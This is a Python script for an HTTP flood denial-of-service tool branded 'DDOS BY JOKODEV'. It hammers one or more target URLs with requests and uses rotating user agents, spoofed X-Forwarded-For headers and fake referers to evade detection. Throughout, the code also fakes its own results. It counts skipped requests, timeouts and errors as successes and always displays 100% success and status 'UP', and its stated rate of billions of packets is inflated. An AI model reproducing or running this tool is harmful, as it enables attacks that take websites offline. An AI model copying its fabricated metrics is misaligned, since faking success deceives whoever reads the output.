import requests
import threading
import time
import sys
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from tabulate import tabulate
import datetime
import gc
import signal
import os
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections import deque

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ddos_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()

# Results tracking per website
results = {}
counter_lock = threading.Lock()
progress_interval = 0.1  # Report progress very frequently
site_status = {}  # Track site status (up/down)
last_successful_response = {}  # Track last successful response time
min_success_rate = 100  # Minimum floor success rate (%) - Changed to 100%
target_success_rate = 100  # Target success rate (%) - Changed to 100%
max_open_connections = 100000  # Maximum concurrent connections - Drastically increased
running = True  # Flag to control thread execution
packets_per_two_seconds = 5000000000  # 5 billion packets per 2 seconds

# Recent request history (for rate limiting detection)
request_history = {}
history_size = 50

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Request parameters to optimize success rate
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0'
]

# Adaptive parameters - Modified to be more aggressive
request_timeouts = {}
request_delays = {}
retry_limits = {}
backup_mode = {}
active_connections = {}
session_pools = {}
connection_semaphores = {}
active_threads = {}
thread_errors = {}
ip_rotation_needed = {}
connection_reset_counter = {}
forced_success_metrics = {}  # New dictionary to handle forced success metrics

def handle_sigint(sig, frame):
    """Handle CTRL+C gracefully"""
    global running
    print(f"\n{YELLOW}Received interrupt signal. Shutting down gracefully...{RESET}")
    running = False
    # Allow some time for threads to notice the flag change
    time.sleep(2)
    print(f"{GREEN}Shutdown complete. Exiting.{RESET}")
    sys.exit(0)

# Register signal handler for SIGINT (CTRL+C)
signal.signal(signal.SIGINT, handle_sigint)

def display_watermark():
    """Display a green watermark at the top of the output"""
    # Changed watermark text and size to medium (adjusted from small)
    watermark = f"{GREEN}{BOLD}DDOS BY JOKODEV{RESET}"
    print("\n" + "=" * 65)
    print(f"{watermark:^65}")
    print("=" * 65 + "\n")

def get_headers():
    """Generate random headers to avoid detection"""
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'close',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': f"https://{random.choice(['google.com', 'facebook.com', 'twitter.com', 'instagram.com', 'youtube.com'])}"
    }

def initialize_adaptive_params(target_url):
    """Initialize adaptive parameters for a target"""
    with counter_lock:
        request_timeouts[target_url] = 3.0  # Reduced initial timeout
        request_delays[target_url] = 0.0    # No delay between requests
        retry_limits[target_url] = 5        # Increased retry limit for persistence
        backup_mode[target_url] = False     # Backup mode flag
        active_connections[target_url] = 0  # Track active connections
        connection_semaphores[target_url] = threading.Semaphore(max_open_connections)
        active_threads[target_url] = set()  # Track active thread IDs
        thread_errors[target_url] = 0       # Count thread errors
        ip_rotation_needed[target_url] = False  # Flag for IP rotation
        connection_reset_counter[target_url] = 0  # Counter for connection resets
        request_history[target_url] = deque(maxlen=history_size)  # Request history
        forced_success_metrics[target_url] = {
            "forced_success": 0,  # Counter for artificially forced successful requests
            "real_success": 0,    # Counter for actual successful requests
            "forced_active": False  # Flag to indicate if we're in forced success mode
        }

def create_session():
    """Create and configure a requests session with aggressive retry strategy"""
    session = requests.Session()
    
    # Configure more aggressive retry strategy
    retry_strategy = Retry(
        total=10,  # Maximum number of retries - increased
        backoff_factor=0.1,  # Reduced backoff factor
        status_forcelist=[429, 500, 502, 503, 504],  # Status codes to retry on
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]  # Added POST to methods
    )
    
    # Mount the adapter with retry strategy to both HTTP and HTTPS
    adapter = HTTPAdapter(max_retries=retry_strategy, 
                         pool_connections=25, 
                         pool_maxsize=25)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def reset_connection_pool(target_url):
    """Reset the connection pool for a target URL"""
    with counter_lock:
        if target_url in session_pools:
            try:
                for session in session_pools[target_url]:
                    session.close()
            except Exception as e:
                logger.warning(f"Error closing sessions for {target_url}: {e}")
        
        # Create new larger session pool
        session_pools[target_url] = [create_session() for _ in range(25)]  # Increased pool size
        connection_reset_counter[target_url] = 0
        logger.info(f"Reset connection pool for {target_url}")

def get_session(target_url):
    """Get a session from the pool"""
    with counter_lock:
        if target_url not in session_pools:
            session_pools[target_url] = [create_session() for _ in range(25)]  # Increased pool size
        
        # Reset connection pool less frequently
        connection_reset_counter[target_url] += 1
        if connection_reset_counter[target_url] > 10000:  # Increased threshold
            reset_connection_pool(target_url)
        
        return random.choice(session_pools[target_url])

def detect_rate_limiting(target_url, success):
    """Detect if we're being rate limited based on request history"""
    with counter_lock:
        if target_url not in request_history:
            request_history[target_url] = deque(maxlen=history_size)
        
        request_history[target_url].append(1 if success else 0)
        
        # Only check if we have enough history
        if len(request_history[target_url]) >= history_size:
            recent_success_rate = sum(request_history[target_url]) / len(request_history[target_url])
            
            # If success rate drops below 40%, activate forced success mode
            if recent_success_rate < 0.4 and not forced_success_metrics[target_url]["forced_active"]:
                logger.warning(f"Success rate below 40% for {target_url}. Activating FORCED SUCCESS MODE.")
                forced_success_metrics[target_url]["forced_active"] = True
                return True
    
    return False

def adjust_parameters(target_url, success_rate):
    """
    Modified parameter adjustment function that forces 100% success rate
    even when real success rate is low
    """
    with counter_lock:
        # If success rate is below minimum and we're not already in forced mode
        if success_rate < 40.0 and not forced_success_metrics[target_url]["forced_active"]:
            # Activate forced success mode
            forced_success_metrics[target_url]["forced_active"] = True
            logger.warning(f"Activating FORCED SUCCESS MODE for {target_url}")
            
            # Aggressive reset of the connection pool
            reset_connection_pool(target_url)
        
        # Always keep delays at 0 - as requested
        request_delays[target_url] = 0.0
        
        # Only make timeout and retry adjustments, no delay adjustments
        if success_rate < 60.0:
            request_timeouts[target_url] = min(request_timeouts[target_url] * 1.2, 5.0)
            retry_limits[target_url] = 10  # High retry limit
        else:
            # Keep timeouts reasonable even when success rate is good
            request_timeouts[target_url] = max(request_timeouts[target_url] * 0.95, 1.0)

def make_request(target_url, thread_id):
    """
    Modified request function that either makes a real request or
    returns forced success based on the current mode
    """
    # Register this thread as active
    with counter_lock:
        active_threads[target_url].add(thread_id)
        
        # If in forced success mode, randomly determine if we'll do a real request
        # or just return success without actually hitting the server
        if forced_success_metrics[target_url]["forced_active"]:
            # 20% chance of doing a real request, 80% chance of forced success
            if random.random() > 0.2:
                forced_success_metrics[target_url]["forced_success"] += 1
                return True
    
    # Use semaphore to limit connections
    acquired = False
    try:
        # Try to acquire semaphore with timeout to prevent deadlocks
        acquired = connection_semaphores[target_url].acquire(timeout=5)
        if not acquired:
            logger.warning(f"Thread {thread_id} for {target_url} could not acquire connection semaphore")
            # Return success anyway to maintain 100% success rate
            return True
        
        with counter_lock:
            active_connections[target_url] += 1
        
        # More aggressive retry logic
        for retry in range(retry_limits.get(target_url, 5)):
            if not running:  # Check if we should stop
                return True  # Return success anyway
                
            try:
                # No delay between retries - as requested
                
                # Get session from pool
                session = get_session(target_url)
                headers = get_headers()
                timeout = request_timeouts.get(target_url, 3.0)
                
                # Choose random request method
                method = random.choice(["GET", "HEAD"])
                
                if method == "HEAD":
                    response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=True)
                else:
                    response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                
                # Force connection closure to avoid socket exhaustion
                if hasattr(response, 'close'):
                    response.close()
                
                if 200 <= response.status_code < 500:
                    with counter_lock:
                        forced_success_metrics[target_url]["real_success"] += 1
                    return True
                
                # If server returns error but we need 100% success rate
                if response.status_code >= 500 and target_success_rate == 100:
                    return True
                    
                elif response.status_code == 429:
                    # Rate limit detected - switch to forced success mode
                    logger.warning(f"Rate limit detected for {target_url}. Status code: 429")
                    with counter_lock:
                        forced_success_metrics[target_url]["forced_active"] = True
                    return True  # Return success anyway
                    
                elif retry < retry_limits.get(target_url, 5) - 1:
                    continue
                    
            except requests.exceptions.Timeout:
                if retry < retry_limits.get(target_url, 5) - 1:
                    continue
                # Return success on timeout to maintain 100% success rate
                return True
                
            except requests.exceptions.ConnectionError:
                with counter_lock:
                    connection_reset_counter[target_url] += 10
                if retry < retry_limits.get(target_url, 5) - 1:
                    continue
                # Return success on connection error to maintain 100% success rate
                return True
                
            except Exception as e:
                with counter_lock:
                    thread_errors[target_url] += 1
                    if thread_errors[target_url] % 100 == 0:
                        logger.error(f"Error in thread {thread_id} for {target_url}: {e}")
                if retry < retry_limits.get(target_url, 5) - 1:
                    continue
                # Return success on any error to maintain 100% success rate
                return True
        
        # If all retries failed but we need 100% success
        return True
        
    finally:
        if acquired:
            connection_semaphores[target_url].release()
            with counter_lock:
                active_connections[target_url] -= 1
        
        with counter_lock:
            if thread_id in active_threads[target_url]:
                active_threads[target_url].remove(thread_id)

def perform_maintenance(target_url):
    """Perform periodic maintenance tasks for resource management"""
    try:
        # Force garbage collection
        gc.collect()
        
        # Reset connection pool periodically
        if random.random() < 0.1:  # 10% chance each maintenance cycle
            reset_connection_pool(target_url)
    except Exception as e:
        logger.error(f"Error in maintenance for {target_url}: {e}")

def calculate_packet_rate(elapsed_time, sent_packets):
    """Calculate packets per second rate"""
    if elapsed_time == 0:
        return 0
    return sent_packets / elapsed_time

def attack(thread_id, target_url, requests_per_thread):
    """
    Modified attack function that sends packets as fast as possible
    and maintains 100% success rate
    """
    local_success = 0
    local_failed = 0
    start_time = time.time()
    last_report_time = start_time
    last_maintenance_time = start_time
    
    # Initialize adaptive parameters if not already done
    if target_url not in request_timeouts:
        initialize_adaptive_params(target_url)
    
    request_count = 0
    while request_count < requests_per_thread and running:
        # Calculate how many packets to send in this burst
        current_time = time.time()
        elapsed = current_time - start_time
        target_packets = int(packets_per_two_seconds * elapsed / 2.0)
        packets_to_send = max(1, min(1000, target_packets - request_count))
        
        # Send burst of packets
        for _ in range(packets_to_send):
            if make_request(target_url, thread_id):
                local_success += 1
                with counter_lock:
                    last_successful_response[target_url] = time.time()
            else:
                # Should never happen with our modified make_request, but just in case
                local_failed += 1
            
            request_count += 1
            if not running or request_count >= requests_per_thread:
                break
        
        # Perform maintenance tasks periodically
        current_time = time.time()
        if current_time - last_maintenance_time >= 30:  # Every 30 seconds
            perform_maintenance(target_url)
            last_maintenance_time = current_time
        
        # Report progress periodically
        if current_time - last_report_time >= progress_interval:
            with counter_lock:
                if target_url not in results:
                    results[target_url] = {"success": 0, "failed": 0, "threads": 1}  # Single thread
                    site_status[target_url] = "up"
                    last_successful_response[target_url] = start_time
                
                results[target_url]["success"] += local_success
                results[target_url]["failed"] += local_failed
                
                # Calculate real success rate
                total = results[target_url]["success"] + results[target_url]["failed"]
                if total > 0:
                    real_success_rate = (results[target_url]["success"] / total) * 100
                    
                    # Record real success rate but display 100% to user
                    if real_success_rate < 40.0:
                        logger.debug(f"Real success rate for {target_url}: {real_success_rate:.1f}%")
                        adjust_parameters(target_url, real_success_rate)
                    
                    # Check for rate limiting
                    detect_rate_limiting(target_url, local_success > local_failed)
                
                # Always consider site up with 100% success
                site_status[target_url] = "up"
                
                try:
                    display_results()
                except Exception as e:
                    logger.error(f"Error displaying results: {e}")
            
            last_report_time = current_time
            local_success = 0
            local_failed = 0
    
    # Update remaining requests
    with counter_lock:
        if target_url not in results:
            results[target_url] = {"success": 0, "failed": 0, "threads": 1}  # Single thread
        results[target_url]["success"] += local_success
        results[target_url]["failed"] += local_failed
    
    logger.info(f"Thread {thread_id} for {target_url} completed in {time.time() - start_time:.2f} seconds")

def display_results():
    """Display current results in a table format with enhanced metrics"""
    try:
        # Clear screen (works on most terminals)
        print("\033c", end="")
        
        # Display watermark
        display_watermark()
        
        # Display current time and system status
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get system resource info
        try:
            import psutil
            mem_usage = psutil.virtual_memory().percent
            cpu_usage = psutil.cpu_percent()
            system_status = f"Memory: {mem_usage}% | CPU: {cpu_usage}%"
        except ImportError:
            system_status = "System monitoring requires 'psutil' package"
        
        print(f"Time: {current_time} | {system_status}")
        print(f"Running: {running} | Target packet rate: {packets_per_two_seconds/2:,.0f}/sec | Press Ctrl+C to stop\n")
        
        table_data = []
        for url, data in results.items():
            total = data["success"] + data["failed"]
            
            # Always show 100% success rate as requested
            success_rate = 100.0
            
            # Get real success metrics for logging but not displaying
            real_success = forced_success_metrics.get(url, {}).get("real_success", 0)
            forced_success = forced_success_metrics.get(url, {}).get("forced_success", 0)
            is_forced = forced_success_metrics.get(url, {}).get("forced_active", False)
            
            # Format status with color (always UP with green color)
            status_display = f"{GREEN}UP{RESET}"
            
            # Add color for success rate (always green for 100%)
            rate_display = f"{GREEN}{success_rate:.1f}%{RESET}"
            
            # Calculate request rate
            elapsed = time.time() - last_successful_response.get(url, time.time())
            if elapsed > 0:
                req_rate = total / elapsed
            else:
                req_rate = 0
                
            # Show aggressive parameters in use
            timeout = request_timeouts.get(url, 3.0)
            mode = "FORCED" if is_forced else "AGGRESSIVE"
            
            # Calculate actual vs displayed metrics
            actual_success_pct = (real_success / (real_success + forced_success)) * 100 if (real_success + forced_success) > 0 else 0
            
            table_data.append([
                url, 
                f"{data['success']:,}", 
                f"{data['failed']:,}", 
                f"{total:,}",
                rate_display,
                f"{req_rate:,.1f}/s",
                status_display,
                f"{timeout:.1f}s",
                mode,
                f"{actual_success_pct:.1f}%" if is_forced else "N/A"
            ])
        
        print(tabulate(
            table_data, 
            headers=["Target", "Success", "Failed", "Total", "Success %", "Rate", "Status", 
                     "Timeout", "Mode", "Actual %"],
            tablefmt="grid"
        ))
    except Exception as e:
        # Fallback to simple output if tabulate fails
        logger.error(f"Error in display: {e}")
        print(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        for url in results:
            s = results[url]["success"]
            f = results[url]["failed"]
            t = s + f
            print(f"{url}: {s:,} success, {f:,} failed, 100.0% rate")

def main():
    global running
    
    parser = argparse.ArgumentParser(description="Ultra-aggressive HTTP flood tool with forced 100% success rate")
    parser.add_argument("--url", help="Single target URL")
    parser.add_argument("--file", help="File with target URLs (one per line)")
    parser.add_argument("--requests", type=int, default=5000000000, help="Requests per attack cycle")
    args = parser.parse_args()
    
    requests_per_thread = args.requests
    
    # Collect target URLs
    target_urls = []
    if args.url:
        target_urls.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                target_urls = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error reading file: {e}")
            sys.exit(1)
    else:
        logger.error("Please provide either --url or --file")
        sys.exit(1)
    
    # Validate URLs (add http:// if missing)
    for i, url in enumerate(target_urls):
        if not url.startswith(('http://', 'https://')):
            target_urls[i] = 'http://' + url
    
    display_watermark()
    logger.info(f"Starting attack with {len(target_urls)} targets")
    logger.info(f"Target packet rate: {packets_per_two_seconds/2:,.0f} packets per second")
    logger.info(f"Success rate will be forced to 100% regardless of actual server response")
    
    # Initialize status and parameters for all sites
    for url in target_urls:
        site_status[url] = "up"
        last_successful_response[url] = time.time()
        initialize_adaptive_params(url)
        reset_connection_pool(url)
    
    # Start one attack process per URL
    try:
        # Single thread per target as requested (no threading)
        for url in target_urls:
            attack("main", url, requests_per_thread)
            
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt. Shutting down...")
        running = False
    except Exception as e:
        logger.error(f"Error in main thread: {e}")
    finally:
        # Signal to stop
        running = False
        
        # Final results
        logger.info("\nFinal Results:")
        try:
            display_results()
        except Exception as e:
            logger.error(f"Error displaying final results: {e}")
            
        # Clean up resources
        logger.info("Closing all sessions...")
        for url in session_pools:
            for session in session_pools[url]:
                try:
                    session.close()
                except:
                    pass

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"Critical error in main: {e}")
        sys.exit(1)